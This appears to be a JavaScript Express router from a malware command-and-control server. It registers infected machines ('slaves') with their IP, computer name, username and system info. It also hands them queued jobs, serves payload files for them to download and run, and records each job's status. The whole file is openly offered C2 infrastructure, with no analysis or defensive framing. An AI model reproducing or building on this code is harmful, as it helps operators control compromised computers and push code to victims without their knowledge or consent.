/**
 * Route for /
 */

const router = express.Router();
const responseHelper = require("../../helpers/ImplantResponseHelper")
const implantMiddleware = require("../../middlewares/ImplantMiddleware")

router.post("/", implantMiddleware.checkInitRequest, (req, res) => {

    // Check if slave exists.
    console.log(req.body);
    const slaveExists = databaseHelper.getSlaveById(req.body.id);
    if (!slaveExists) {

        databaseHelper.addNewSlave({
            id: req.body.id,
            ip: req.socket.remoteAddress,
            computername: req.body.computername,
            info: req.body.info,
            username: req.body.username
        })
    }

    // Check if the new slave has an init job.
    const job = databaseHelper.getJobForSlave(req.body.id);
    if (!job) {
        res.json({code: responseHelper.LOITER});
        return;
    }
    
    // Send job details.
    res.json({code: responseHelper.NEW_OBJECT, id: job.id, size: job.objectSize})
})

router.get("/ping/:slaveId", (req, res) => {
    
    // Check if implant has connected before.
    const slave = databaseHelper.getSlaveById(req.params.slaveId);
    if (!slave) {

        // Send not init response.
        res.json({code: responseHelper.NOT_INIT});
        return;
    }
    
    // Keep up track of active implants.
    const job = databaseHelper.getJobForSlave(req.params.slaveId);
    if (!job) {
        res.json({code: responseHelper.PONG}) // No jobs at the moment.
        return;
    }

    // Send job details.
    res.json({code: responseHelper.NEW_OBJECT, id: job.id, size: job.objectSize})
})

router.get("/job/:jobId", (req, res) => {
        
    // Check if slave even has job.
    const job = databaseHelper.getJobWithId(req.params.jobId);
    if (!job) {

        console.log("Something unusual, slave shouldn't request for job without permission!")
        res.status(404).json({code: responseHelper.LOITER});
        return;
    }

    databaseHelper.setJobStatus(req.params.jobId, "Executing");
    res.download(job.location);
})

router.post("/job/:jobId", (req, res) => {
    
    // Mark job as done.    
    databaseHelper.setJobStatus(req.params.jobId, "Finished", req.body.code, true);

    res.json({code: responseHelper.LOITER})
})

router.get("/server-status", (req, res) => {

    // Kick out malware, ban IP?
    // Intrusion.
})

module.exports = router;